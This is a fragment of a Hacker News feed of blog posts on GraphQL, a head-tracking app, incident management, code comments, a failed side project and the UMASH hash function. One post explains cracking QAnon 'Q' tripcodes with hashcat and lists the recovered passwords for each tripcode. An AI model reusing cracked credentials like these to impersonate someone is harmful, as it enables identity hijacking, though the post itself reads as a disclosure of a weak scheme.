<p>The best way to begin with GraphQL Nexus is of course the <a href="https://nexus.js.org/docs/getting-started">official documentation</a>. After familiarizing with it the next step could be playing around with their <a href="https://github.com/prisma/nexus/tree/develop/examples">official examples</a> and the <a href="https://nexus.js.org/playground">online Playground</a>. Have fun!</p></div><p>The GraphQL Editor is a supportive tool for both advanced GraphQL users as well as those taking their first steps with GraphQL APIs. Our all-in-one development environment for GraphQL will help you build, manage &amp; deploy your GraphQL API much faster thanks to dozens of built-in micro features. Its graphical interface will also fix communication within your product team. Visualization is the key!</p></div>]]>
            </description>
            <link>https://blog.graphqleditor.com/graphql-nexus-codefirst-graphql-server/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24269944</guid>
            <pubDate>Tue, 25 Aug 2020 10:46:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Seamless head tracking for games using the TrueDepth camera (iOS)]]>
            </title>
            <description>
<![CDATA[
Score 25 | Comments 16 (<a href="https://news.ycombinator.com/item?id=24269925">thread link</a>) | @epaga
<br/>
August 25, 2020 | http://www.inflightassistant.com/smoothtrack/index.html | <a href="https://web.archive.org/web/*/http://www.inflightassistant.com/smoothtrack/index.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <div>
        <h2>
          <p><a href="https://apps.apple.com/de/app/smoothtrack/id1528839485?l=en"><img src="http://www.inflightassistant.com/img/appstore.svg" height="45/"></a></p>
            
            <p><b><a href="https://testflight.apple.com/join/ytc1tAdA">Click here to join a free public beta</a> which runs on ANY iOS 13 device, not only ones with TrueDepth!</b></p>
            
          <p>SmoothTrack is the best input source for the free OpenTrack software which enables you to use head tracking in your Mac or PC games.</p>
<br>
<div>
  <div>
    <div>
      <p>
        <h6>
          "Just flew a few patterns with this - it genuinely works better for me than TrackIR ever did, at a fraction of the cost." - /u/yawnyprawny
        </h6>
      </p>
    </div>
  </div>
</div>

          <p>SmoothTrack provides you with 6 degrees-of-freedom head tracking for beautiful head tracking for your games.</p>
          

            <p>No headset or extra equipment of any kind is required! Simply set up your device so that it can see your face. Using the on-screen controls, you can shift your perspective in-game.</p>
            

              <p>It's an amazing experience to seamlessly move your head and have your game perspective play along.</p>
              <br>
              <div>
                <div>
                  <div>
                    <p>
                      <h6>
                        "This worked perfectly and way better than expected! Totally enhanced my experience with MFS 2020!" - /u/lexpert1
                      </h6>
                    </p>
                  </div>
                </div>
              </div>
              
              
                <p>Any game that supports the FreeTrack or TrackIR protocol will work with this, including Flight Simulator, Elite: Dangerous, FSX, IL2: Sturmovik, and many, many others!</p>
                

                  <p>INSTRUCTIONS (included in the app):</p>
                  <br>

                    <ol><li>On your computer, install and run the free program "OpenTrack".</li>
                      <li>In OpenTrack, as Input source, choose "UDP over network". As Output, choose "freetrack 2.0 Enhanced".</li>
                        <li>Make sure the UDP port OpenTrack is using is open both on your firewall and router.</li>
                          <li>Find the IP address of your PC</li>
                            <li>Now, in SmoothTrack, set up your IP address and port in the settings</li>
                              <li>Tap Play and you should see the OpenTrack octopus move around, which means any game that supports TrackIR will now be supporting your head tracking!</li>
</ol>
<p>Email support is provided if there are any issues.</p>

    
  
</h2></div></div></div>]]>
            </description>
            <link>http://www.inflightassistant.com/smoothtrack/index.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24269925</guid>
            <pubDate>Tue, 25 Aug 2020 10:43:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Incident updates, interruptions and the 30 minute window]]>
            </title>
            <description>
<![CDATA[
Score 20 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24269804">thread link</a>) | @vinnyglennon
<br/>
August 25, 2020 | https://www.unixdaemon.net/sysadmin/incident-updates-and-interruptions/ | <a href="https://web.archive.org/web/*/https://www.unixdaemon.net/sysadmin/incident-updates-and-interruptions/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody"><p>For most companies Incident Commander or Incident Manager is not a
specific job, it’s a role you may take on when something has gone, often
horribly, wrong and you need to quickly unite an adhoc group into a team
to resolve it. The incident commander should be the point of contact,
and source of truth, about your incident and to do that successfully
they’ll need to be updated and kept informed about what’s happening.
Depending on how experienced they are in the role this can be a very
light touch experience or it can feel like being constantly nagged to
put the washing away while someone burns money nearby.</p>
<p>I’ve been involved in a fair few incidents over the years and one of the
best approaches I’ve seen to handling updates and interruptions was from
someone who had an amazing internal clock; or a watch we never noticed.
When handling an incident he’d essentially give himself a 30 minute,
reset-able, window of time. Once he’d been given the initial
introduction to the incident he’d step back, handle the communication
and anything else the incident responders has asked for and wait for
about 30 minutes.</p>
<p>If no one gave him any new information or status updates he’d consider
it an invitation to interrupt and ask what was going on. Once he’d been
updated he’d move back and let the team run with the problem. If someone
gave him an update before the 30ish minutes were up he’d reset his
timer, leave you alone and try to get whatever you’d asked for. I don’t
know if it was just a well chosen period based on experience or the
limit of his patience but 30 minutes was often enough to stop people
rabbit holing while the fires were raging.</p>
<p>Once I’d left the team he often managed incidents for and became one of
his internal customers I began to notice that everyone in his area
developed the subconscious habit of delivering their status updates
every 25 minutes or so, even when he wasn’t the incident manager for
a specific incident. I never discovered if this was all a deliberate
attempt to set the culture he wanted or he was just being himself but as
someone handling an incident I always appreciated the time and
predictability of his involement. Thanks to LinkedIn and Twitter I could
probably track him down and ask but I’ve always liked the idea it was
just him being himself.</p>
</div></div>]]>
            </description>
            <link>https://www.unixdaemon.net/sysadmin/incident-updates-and-interruptions/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24269804</guid>
            <pubDate>Tue, 25 Aug 2020 10:18:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Writing good software comments (Part I/2019)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24269760">thread link</a>) | @juanorozcov
<br/>
August 25, 2020 | https://www.brainstobytes.com/writing-good-software-comments-i/ | <a href="https://web.archive.org/web/*/https://www.brainstobytes.com/writing-good-software-comments-i/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
						<!--kg-card-begin: markdown--><p>Comments are, to put it mildly, a controversial topic.</p>
<p>There are two very strong opinions in software development, both extremely popular and widespread. The first one states that comments are evil, and you should not use them under any circumstance. The main argument is that instead of using comments, you should try to make the code as readable as possible. If the code is written in an expressive way using best practices, comments are not needed.</p>
<p>The second group thinks that comments are a necessity. The code can't hold all the information needed to properly maintain a solution, and comments are an effective way of communication for fellow developers. If all we needed was the code, we could grab the binaries and work from them.</p>
<p>I think both groups have something valuable to teach. It's true that comments can be dangerous, some of the reasons why you might be wary of them are:</p>
<ul>
<li>Comments easily become outdated, and it's unreasonable to expect everyone to update every comment when code changes. It would be an ideal thing, but it rarely happens in reality.</li>
<li>Code is the sole source of truth that is guaranteed to be true at any given point through the lifecycle of software.</li>
<li>A bad comment is worse than no comments at all, as it misleads you into wrong assumptions.</li>
<li>When overused, comments clutter our code and make it harder to find the things we are looking for.</li>
</ul>
<p>Comments are essentially there because we weren't able to perfectly express our ideas in code. Every single time you write a comment, think if it's possible to refactor your code in a way that makes it obvious to the reader. With effort and experience, you can remove most of the unnecessary comments from your projects.</p>
<p>Despite their downsides, comments can be used to effectively communicate with fellow developers. The trick is not to repeat your code, but to clarify its intent and provide valuable extra information that you can't represent in code. If you can keep your comments at a higher level of abstraction, you will have a powerful tool for making your code more maintainable.</p>
<p>Let's take a look at 5 scenarios where using comments can help improve the readability of our code:</p>
<h4 id="explainingtheintentandansweringwhy">Explaining the intent and answering why</h4>
<p>Explaining why things are done in a specific way in the code is one of the most accepted uses for comments.</p>
<p>The reason is simple: code itself only tells you <strong>what</strong> is there, not <strong>why</strong> it is there. The motivations behind seemingly arbitrary choices in design and development are usually found in the documentation, but if you need to keep this information in the source code, comments are the best way of doing it.</p>
<p>Feel free to add comments if you feel that something looks too arbitrary, or to let other developers know why you are doing things the way you are doing them. Don't write a huge essay supporting the choice, a quick one-liner is enough to convey information. Other developers will appreciate this valuable information.</p>
<h4 id="clarifyingdetails">Clarifying details</h4>
<p>Sometimes you need to write small clarifications for input arguments or data returned from a function, in this case, a comment might make things easier to understand.</p>
<p>It's also useful for summarizing a series of complicated operations: writing a small comment that explains the intent of the following lines is useful to understand how they work together.</p>
<p>Another common usage is specifying the units of a variable: is this meant to be a distance in meters or feet?</p>
<p>This might be the weakest use case of the list because comments of this type are rendered useless by giving variables and functions good names. If you want some guidelines for naming variables, you can read the <a href="https://www.brainstobytes.com/writing-good-variable-names/">previous article on the topic</a>.</p>
<h4 id="warningtheuserofamethodaboutsideeffects">Warning the user of a method about side effects</h4>
<p>There are methods with 'dangerous' side effects. Some of them will perform actions that are hard or impossible to revert or will remove records from an important record.</p>
<p>You could have in place some special naming conventions to make this clear. The Ruby community, for example, has a convention for appending a '!' character at the end of methods that perform this type of action. If there is a need for a more detailed explanation, feel free to add a comment explaining the possible dangers of calling a specific method.</p>
<pre><code># Warning!: This method will stop the pipeline and all unprocessed data will be lost, 
# ensure the queue is empty before calling it, otherwise, you might lose data. 
def perform_teardown():
#    Implementation of this method
   return
</code></pre>

<p>You can add little reminders for things you need to improve or refactor later. There are lots of changes that don't merit a new ticket in the issue tracking system, and those little reminders can be useful for not forgetting about these little improvements.</p>
<p>Most modern text editors and IDEs have tools for finding those TODOs, and I have the feature enabled in every single one I use (actually, it's one of the first things I do when setting up a new system). Use them with confidence, TODO comments are ok.</p>
<pre><code># TODO: Find out if there's an efficient alternative for linear algebra and make this method a wrapper around it
def transpose_matrix(matrix)
# code for transposing a matrix
end

</code></pre>
<h4 id="publicapidocumentation">Public API documentation</h4>
<p>Documenting the public interface of your classes is a very important part of software development. You want other users (and well, you too) to know how to use your classes and code. There are many tools that let you convert comments into documentation (PDF, HTML, and other formats), as long as you write your comments with a specific format. The tool will scan your code and extract all the required information for the documents.</p>
<p>Some popular examples are Javadoc for Java and YARD for Ruby, the comments on top of methods look like this:</p>
<p>Javadoc:</p>
<pre><code>/**
 * &lt;p&gt;Translates text from English to alienspeak
 * &lt;/p&gt;
 * @param textInEnglish the text in English I want to translate
 * @return the text after being translated into alienspeak
 */
public String translateToAlienspeak(String textInEnglish) {
    // contents of the function
}
</code></pre>
<p>YARD:</p>
<pre><code># Translates a text from English to alienspeak
#
# @param text_in_english [String] the text in English I want to translate
# @return [String] the text after being translated into alienspeak
def translate_to_alienspeak(text_in_english)
  # content of the function
end
</code></pre>

<p>These are just a couple of cases where comments are helpful, but there are many other scenarios where using a comment is the right thing.</p>
<p>The trick for writing good comments is asking yourself why you are writing them in the first place. Is it to fix a deficiency in the clarity of your code? if that's the case, stop and refactor your code to make it more readable. As we said before, most comments can be omitted in favor of a better-written piece of code.</p>
<p>On the other hand, if you are providing information that your colleagues will find helpful, and there is no way to embed that info in the code, then go for a comment. Good comments can be extremely helpful. Just make sure they are <em>good</em> comments, not lazy patches for code that can still improve.</p>
<p>In the next article, we will see scenarios where comments are definitely a bad choice.</p>
<h2 id="whattodonext">What to do next:</h2>
<ul>
<li>Share this article with friends and colleagues. Thank you for helping me reach people who might find this information useful.</li>
<li>You can find more information about creating good function arguments in chapter 4 of Clean Code, and in chapter 32 of Code Complete. This and other very helpful books can be found in the <a href="https://www.brainstobytes.com/recommended-books/">recommended reading list</a>.</li>
<li>Send me an email with questions, comments or suggestions (it's in the <a href="https://www.brainstobytes.com/about">About Me page</a>). Come on, don't be shy!</li>
</ul>
<!--kg-card-end: markdown-->
					</div></div>]]>
            </description>
            <link>https://www.brainstobytes.com/writing-good-software-comments-i/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24269760</guid>
            <pubDate>Tue, 25 Aug 2020 10:11:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why I'm shutting down my side-hustle with zero revenue despite traction]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24269743">thread link</a>) | @codecors
<br/>
August 25, 2020 | https://meetchopra.com/blog/looking-back-at-prosper | <a href="https://web.archive.org/web/*/https://meetchopra.com/blog/looking-back-at-prosper">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><div><div><div><article><p>10 months ago, I launched Prosper which started as an NPS software, but ended up becoming a marketing tool. I’m writing this to reflect on why I won't be working on Prosper anymore. What went wrong? What went good? And lastly, what I’m working on next. </p><h2>The Launch</h2><p>The idea behind Prosper was simple, video popups for capturing email address. I added video inside popups to make marketing more real by showing the real person behind the website. It was a completely an unexplored idea. I developed Prosper on weekends and after office hours as I had a full time job.</p><p>It took me a month or two to develop, and on Oct 15th, I launched Prosper on Product Hunt and Hacker News. At the time of launch, I kept the product free, so people could try it out without any friction. The launch went pretty good, and Prosper became #5 trending product of the day. </p><p>For launching on Product Hunt, you might have heard of tactics like, post on Tuesday, 00:00 pacific time. All these matters!. But, one thing that helped me was - the idea. It was the new which helped me a lot in catching eyeballs. People were automatically <a href="https://twitter.com/manikarthik/status/1184018595824619520">sharing and talking</a> about the product. </p><p>And, getting comments&nbsp;from <a href="https://twitter.com/rrhoover">Ryan Hoover</a> (founder of Product Hunt) and <a href="https://twitter.com/jijosunny">Jijo Sunny</a> (founder of Buymeacoffee) added more fuel to my motivation. Whatever users I have got, I can attribute it to Product Hunt only. </p><p data-url=""><img src="https://images.prismic.io/meetchopra/92586717-049b-4af5-ace9-0dc3a399af99_PH_Comments.png?auto=compress,format&amp;rect=0,0,879,208&amp;w=1200&amp;h=284"></p><p>At the same time, launching on Hacker News didn’t bring anything. People there didn’t like the product at all. Hacker News is a really unpredictable platform.&nbsp;</p><h2>Where things started falling</h2><p>After the launch, I started monitoring how the popups were performing. And, here’s where it all started going down.</p><p>According to SumoMe, the average performing popups resulted in 3.1% conversion rate. As I was introducing a new type of solution, it should be at least double the existing conversion rate, which should be around 6%.</p><p data-url=""><img src="https://images.prismic.io/meetchopra/c938d4d5-5c20-4ee5-a066-03dc895a55fe_conversion.png?auto=compress,format&amp;rect=0,0,586,367&amp;w=1200&amp;h=752"></p><p>For my product, 444 users signed up out of which only 5% (23) of the people gave it a try by installing on their website. Out of this thin slice of bread, the conversion rate was nothing. The conversion rate didn't even match for an average performing popups.</p><p data-url=""><img src="https://images.prismic.io/meetchopra/b7280505-7a10-410f-b48d-3bd09298cc4a_prosper_graph.png?auto=compress,format&amp;rect=0,0,1355,788&amp;w=1200&amp;h=698"></p><p>The product needed more experiments at a fast speed like building more types of popups, talking to customers, etc.</p><p>After getting such a good reaction to the idea, and the product not performing well. I was stuck. I didn’t know what to do. It was a pretty confusing state to be in. The product needed more work on a fundamental level. With more experiments at a fast speed, and talking to customers, I’m sure the product would have been in a better place.</p><p>But it struck me hard. I started losing motivation. I was not able to convince myself that my popup works better than the existing one. It was some kind of decision paralysis, where I didn’t know what to pick up next. As I was working solo, it became difficult for me to iterate fast on the product, respond to customers, and work on marketing it all by myself.</p><p>So, as an IndieHacker it turned out to be a pretty bad idea to start with an experimental idea. It was tough and the odds of success are always low if the whole idea is an experiment. It's better to build and serve a proven market that is big enough, as an IndieHacker. Starting with a new idea, that hasn’t been explored much, needs a lot of consistent work which becomes difficult for a single person. So, Prosper turned out to be a bad idea for me.</p><p>What Justin Jackson said in <a href="https://justinjackson.ca/good-idea-or-bad-idea">good idea or bad idea</a> fit’s here perfectly: </p><blockquote><div><p>Bad ideas are&nbsp;hungry: they consume whatever energy, money, or time you throw at them, without giving you anything back.
</p><p>
Good business ideas sweep you up with their momentum.</p></div><a href="#"><svg xmlns="http://www.w3.org/2000/svg" role="img" viewBox="0 0 24 24" data-src="/img/icons/social/twitter.svg" xmlns:xlink="http://www.w3.org/1999/xlink"><title>Twitter icon</title><path d="M23.954 4.569c-.885.389-1.83.654-2.825.775 1.014-.611 1.794-1.574 2.163-2.723-.951.555-2.005.959-3.127 1.184-.896-.959-2.173-1.559-3.591-1.559-2.717 0-4.92 2.203-4.92 4.917 0 .39.045.765.127 1.124C7.691 8.094 4.066 6.13 1.64 3.161c-.427.722-.666 1.561-.666 2.475 0 1.71.87 3.213 2.188 4.096-.807-.026-1.566-.248-2.228-.616v.061c0 2.385 1.693 4.374 3.946 4.827-.413.111-.849.171-1.296.171-.314 0-.615-.03-.916-.086.631 1.953 2.445 3.377 4.604 3.417-1.68 1.319-3.809 2.105-6.102 2.105-.39 0-.779-.023-1.17-.067 2.189 1.394 4.768 2.209 7.557 2.209 9.054 0 13.999-7.496 13.999-13.986 0-.209 0-.42-.015-.63.961-.689 1.8-1.56 2.46-2.548l-.047-.02z"></path></svg><span>Tweet</span></a></blockquote><h2>Quick Learnings</h2><p>While working on Prosper, I learned a few small things. Here’s some of them:</p><ul><li>One thing that struck out was the importance of keeping in touch with your customers, especially in the early days. Be it on twitter, running an email series, or whatever. That’s where you can learn more about them and decide the direction of the product. Talking to customers on support is the best source where you can know them better. </li><li>Keeping your support channels limited. For Prosper, I added my email address, support email address, live chat, and&nbsp;even a phone number. Creating multiple channels to contact was a terrible move. I was not able to reply properly to any customer. I lost the chance to connect with the customers there. For my next products, I have shifted to live chat only. Much better. There's less friction on reaching over chat. </li></ul><p><em>One tip, don’t install drift. Installing drift was a pretty bad decision. You can’t even reply to a chat from email. And, the whole platform&nbsp;seems to be lost. I have started using <a href="https://crisp.chat/">crisp</a> for all my products. Much better. Tons of reliable features with great support.</em></p><ul><li>User onboarding, is very critical. Displaying the value early often and delivering the wow moment will make them come back to your software. Otherwise, people forget about your software after trying it out. If you look at Prosper’s metrics, 76% (341 people) did nothing after signing up. Clearly, I failed at&nbsp;showing the value upfront clearly in as few steps as possible. </li></ul><p data-url=""><img src="https://images.prismic.io/meetchopra/f46fcea2-e502-4f7a-97f0-7a418425bf2c_analytics_prosper.png?auto=compress,format&amp;rect=0,0,1366,820&amp;w=1200&amp;h=720"></p><h2>What’s next?</h2><p>I have 2 things on my plate.</p><p><a href="https://usespotlight.co/">Spotlight</a> and a new product I will be working on -&nbsp;<a href="https://waveapp.io/">Wave</a>.</p><p>I’m building a popup builder. It’s one place for all types of popups. This time I’m not looking for an experimental idea. Since I have some experience in this type of product and with&nbsp;all the previous learnings,&nbsp;I hope it will perform better.&nbsp;I plan to focus more on marketing and building it in public. You can follow me on <a href="https://twitter.com/@meet__chopra">twitter</a>&nbsp;as I share my progress.  </p><p>Also, I’m offering a lifetime deal until&nbsp;I launch the product. Go, check it out - <a target="_blank" rel="noopener" href="https://waveapp.io/">waveapp.io</a></p><p data-url="https://waveapp.io/"><img src="https://images.prismic.io/meetchopra/aa3ad0ce-c328-471d-9ab9-83b9b70bef33_social.png?auto=compress,format&amp;rect=0,0,1200,630&amp;w=1200&amp;h=630"></p><p><em>Thanks to <a target="_blank" rel="noopener" href="https://www.linkedin.com/in/divyasharma411/">Divya Sharma</a> for reviewing the article and making it readable :)</em></p></article></div></div></div></section></div>]]>
            </description>
            <link>https://meetchopra.com/blog/looking-back-at-prosper</link>
            <guid isPermaLink="false">hacker-news-small-sites-24269743</guid>
            <pubDate>Tue, 25 Aug 2020 10:08:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Q from QAnon proves his identity using DES and a 2 character salt from password]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24269647">thread link</a>) | @DyslexicAtheist
<br/>
August 25, 2020 | https://poal.co/s/Whatever/96505 | <a href="https://web.archive.org/web/*/https://poal.co/s/Whatever/96505">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content-f9b525e3-30b3-4d38-89c4-1733cfc7da6e">
                  <p>Q verifies his identity via a cryptographic signature, or "tripcodes."  These tripcode hashes (e.g. CbboFOtcZs ) are based on the DES/crypt(3) encryption algorithm.  DES (Digital Encryption Standard) was standardized in 1977 and has been largely deprecated due to widely-known weaknesses.  A good primer on these weaknesses from way back in 1997 can be found here: <a href="http://personal.stevens.edu/~khockenb/crypt3.html">http://personal.stevens.edu/~khockenb/crypt3.html</a> .   Tripcodes are created via the algorithm described here: <a href="http://www.thefullwiki.org/Tripcode">http://www.thefullwiki.org/Tripcode</a>.  I suspect that if such an operation were carried out, the coordinator would at least sign messages using an algorithm from the NSA Suite B, such as the Advanced Encryption Standard (AES) -- or even a PGP signature -- so that an opponent couldn't hijack his identity as easily as has been done here.  He may upgrade his standards after reading this, but frankly, it is a far too late to matter.</p>

<p>Using an open source password cracker (hashcat), publicly available information, and a little guess work about Q's favored key space, a user can successfully recover all of the passwords that correspond to Q tripcodes. These are posted below in chronological order of use:</p>

<p>Tripcode:  ITPb.qbhqo  -&gt;  Password:  Matlock
Tripcode:  UW.yye1fxo  -&gt;  Password:  M@tlock!
Tripcode:  xowAT4Z3VQ  -&gt;  Password:  Freed@m-
Tripcode:  2jsTvXXmXs  -&gt;  Password:  F!ghtF!g
Tripcode:  4pRcUA0lBE  -&gt;  Password:  NowC@mes
Tripcode:  CbboFOtcZs  -&gt;  Password:  StoRMkiL
Tripcode:  A6yxsPKia.  -&gt;  Password:  WeAReQ@Q</p>

<p>Note that Q seems to be unaware that the algorithm only takes the first 8 characters of the password and ignores the rest.  In the past, Q has claimed to have baked meaning and foreknowledge of future events into these passwords, in particular, the 4pRcUA0lBE:NowC@mes tripcode-password pair.  If I understand correctly, Q claims that the full password was "NowC@mesTHEP@in---23," with 23 signifying the date of an important event, but anything beginning with "NowC@mes" would yield the same tripcode signature.  This weakness severely undercuts any claimed predictive power and indicates a possible intent to mislead.  For example, all of the following passwords should yield the same tripcode, 4pRcUA0lBE:</p>

<p>NowC@mesTheKing      -- Q is Snoop Dogg
NowC@mesTheSun       -- Q is Ringo Starr
NowC@mesTheAnswer-42 -- Q is Douglas Adams</p>

<p>These can all be tested at at minichan's tripcode test page. <a href="https://minichan.org/triptest?name=A%23NowC%40mesTheAnswer-42">https://minichan.org/triptest?name=A%23NowC%40mesTheAnswer-42</a> .</p>

<p>To directly test all of these examples with a DES cypher, go to <a href="https://www.functions-online.com/crypt.html">https://www.functions-online.com/crypt.html</a> , paste the password in, and use the second and third characters of the password as the salt.  The tripcode will be the final ten characters of the resulting DES hash.  </p>

          </div></div>]]>
            </description>
            <link>https://poal.co/s/Whatever/96505</link>
            <guid isPermaLink="false">hacker-news-small-sites-24269647</guid>
            <pubDate>Tue, 25 Aug 2020 09:53:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Umash: A fast and universal enough hash]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24269645">thread link</a>) | @gbrown_
<br/>
August 25, 2020 | https://engineering.backtrace.io/2020-08-24-umash-fast-enough-almost-universal-fingerprinting/ | <a href="https://web.archive.org/web/*/https://engineering.backtrace.io/2020-08-24-umash-fast-enough-almost-universal-fingerprinting/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><article><div><p>We accidentally a whole hash function… but we had a good reason!
Our
<a href="https://github.com/backtrace-labs/umash">MIT-licensed UMASH hash function</a>
is a decently fast non-cryptographic hash function that guarantees
a worst-case bound on the probability of collision
<a href="https://en.wikipedia.org/wiki/Universal_hashing#Mathematical_guarantees">between any two inputs generated independently of the UMASH parameters</a>.</p><p>On the
<a href="https://en.wikichip.org/wiki/intel/xeon_platinum/8175m">2.5 GHz Intel 8175M</a>
servers that power <a href="https://backtrace.io/">Backtrace</a>’s hosted
offering, UMASH computes a 64-bit hash for short cached inputs of up
to 64 bytes in 9-22 ns, and for longer ones at up to 22 GB/s, while
guaranteeing that two distinct inputs of at most \(s\) bytes collide
with probability less than \(\lceil s / 2048 \rceil \cdot 2^{-56}\).
If that’s not good enough, we can also reuse most of the parameters to
compute two independent UMASH values. The resulting 128-bit
<a href="https://en.wikipedia.org/wiki/Fingerprint_(computing)">fingerprint function</a>
offers a short-input latency of 9-26 ns, a peak throughput of 11.2
GB/s, and a collision probability of \(\lceil s / 2048 \rceil^2 \cdot
2^{-112}\) (better than \(2^{-70}\) for input size up to 7.5 GB).
These collision bounds hold for all inputs constructed without any
feedback about the randomly chosen UMASH parameters.</p><p>The latency on short cached inputs (9-22 ns for 64 bits, 9-26 ns for
128) is somewhat worse than the state of the art for non-cryptographic
hashes—
<a href="https://github.com/wangyi-fudan/wyhash">wyhash</a> achieves
8-15 ns and <a href="http://fastcompression.blogspot.com/2019/03/presenting-xxh3.html">xxh3</a>
8-12 ns—but still in the same ballpark. It also
compares well with latency-optimised hash functions like
<a href="https://en.wikipedia.org/wiki/Fowler%E2%80%93Noll%E2%80%93Vo_hash_function#FNV-1a_hash">FNV-1a</a>
(5-86 ns) and
<a href="https://en.wikipedia.org/wiki/MurmurHash#MurmurHash2">MurmurHash64A</a>
(7-23 ns).</p><p>Similarly, UMASH’s peak throughput (22 GB/s) does not match
the current best hash throughput (37 GB/s with
<a href="https://github.com/Cyan4973/xxHash">xxh3</a>
and <a href="https://github.com/gamozolabs/falkhash">falkhash</a>, apparently
10% higher with <a href="https://github.com/cmuratori/meow_hash">Meow hash</a>),
but does comes within a factor of two; it’s actually higher than that of
some performance-optimised hashes, like
<a href="https://github.com/wangyi-fudan/wyhash">wyhash</a> (16 GB/s) and
<a href="https://github.com/google/farmhash">farmhash32</a>
(19 GB/s). In fact, even the 128-bit fingerprint (11.2 GB/s) is
comparable to respectable options like
<a href="https://github.com/aappleby/smhasher/blob/master/src/MurmurHash2.cpp#L89">MurmurHash64A</a>
(5.8 GB/s) and
<a href="https://burtleburtle.net/bob/hash/spooky.html">SpookyHash</a> (11.6 GB/s).</p><p>What sets UMASH apart from these other non-cryptographic hash
functions is its proof of a collision probability bound. In the
absence of an adversary that adaptively constructs pathological inputs
as it infers more information about the randomly chosen parameters, we
know that two distinct inputs of \(s\) or fewer bytes will have the
same 64-bit hash with probability at most \(\lceil s / 2048 \rceil
\cdot 2^{-56},\) where the expectation is taken over the random
“key” parameters.</p><p>Only one non-cryptographic hash function in
<a href="https://github.com/rurban/smhasher">Reini Urban’s fork of SMHasher</a>
provides this sort of bound: <a href="https://github.com/lemire/clhash">CLHash</a>
<a href="https://arxiv.org/abs/1503.03465">guarantees a collision probability \(\approx 2^{-63}\)</a>
in the same
<a href="https://en.wikipedia.org/wiki/Universal_hashing#Mathematical_guarantees">universal hashing</a>
model as UMASH. While CLHash’s peak throughput (22 GB/s) is
equal to UMASH’s, its latency on short inputs is worse (23-25 ns
instead of 9-22ns). We will also see that its stronger collision
bound remains too weak for many practical applications. In order to
compute a <a href="https://en.wikipedia.org/wiki/Fingerprint_(computing)">fingerprint</a>
with CLHash, one would have to combine multiple hashes, exactly like
we did for the 128-bit UMASH fingerprint.</p><p>Actual cryptographic hash functions provide stronger bounds in a much
more pessimistic model; however they’re also markedly slower than
non-cryptographic hashes. <a href="https://github.com/BLAKE3-team/BLAKE3">BLAKE3</a>
needs at least 66 ns to hash short inputs, and achieves a peak throughput
of 5.5 GB/s. Even the <a href="https://github.com/rust-lang/rust/issues/29754">reduced-round SipHash-1-3</a>
hashes short inputs in 18-40 ns and longer ones at a peak throughput
of 2.8 GB/s. That’s the price of their pessimistically adversarial
security model. Depending on the application, it can make sense to
consider a more restricted adversary that must prepare its dirty deed
before the hash function’s parameters are generated at random, and
still ask for provable bounds on the probability of collisions.
That’s the niche we’re targeting with UMASH.</p><p>Clearly, the industry is comfortable with no bound at all.
However, even in the absence of
<a href="https://www.131002.net/siphash/#at">seed-independent collisions</a>,
timing side-channels in a data structure implementation could
theoretically leak information about colliding inputs, and iterating
over a hash table’s entries to print its contents can divulge even more
bits. A sufficiently motivated adversary could use something like
that to learn more about the key and deploy an algorithmic denial of
service attack. For example, the linear structure of UMASH (and of
other polynomial hashes like CLHash) makes it easy to combine known
collisions to create exponentially more colliding inputs. There is no
universal answer; UMASH is simply another point in the solution space.</p><p>If reasonable performance coupled with an actual bound on collision
probability <em>for data that does not adaptively break the hash</em> sounds
useful to you,
<a href="https://github.com/backtrace-labs/umash">take a look at UMASH on GitHub</a>!</p><p>The <a href="#but-why">next section</a> will explain why we found it useful to
design another hash function. The rest of the post
<a href="#umash-high-level">sketches how UMASH works</a> and
<a href="#implementation-tricks">how it balances short-input latency and strength</a>,
before <a href="#usage">describing a few interesting usage patterns.</a></p><p><small>The latency and throughput results above were all measured on
the same unloaded 2.5 GHz Xeon 8175M. While we did not disable
frequency scaling (#cloud), the clock rate seemed stable at 3.1
GHz during our run.</small></p><h2 id="a-idbut-whyahow-did-we-even-get-here"><a id="but-why"></a>How did we even get here?</h2><p>Engineering is the discipline of satisficisation: crisply defined
problems with perfect solutions rarely exist in reality, so we must
resign ourselves to satisfying approximate constraint sets “well
enough.” However, there are times when all options are not only
imperfect, but downright sucky. That’s when one has to put on a
different hat, and question the problem itself: are our constraints
irremediably at odds, or are we looking at an under-explored
solution space?</p><p>In the former case, we simply have to want something else. In the
latter, it might make sense to spend time to really understand the
current set of options and hand-roll a specialised approach.</p><p>That’s the choice we faced when we started caching intermediate
results in
<a href="https://help.backtrace.io/en/articles/2428859-web-console-overview">Backtrace’s database</a>
and found a dearth of acceptable hash functions. Our in-memory
columnar database is a core component of the backend, and, like most
analytics databases, it tends to process streams of similar queries.
However, a naïve query cache would be ineffective: our more heavily
loaded servers handle a constant write load of more than 100 events
per second with dozens of indexed attributes (populated column values)
each. Moreover, queries invariably select a large number of data
points with a time windowing predicate that excludes old data… and
the endpoints of these time windows advance with each wall-clock
second. The queries evolve over time, and must usually consider newly
ingested data points.</p><p><a href="https://www.gsd.inesc-id.pt/~rodrigo/slider_middleware14.pdf">Bhatotia et al’s Slider</a>
show how we can specialise the idea of
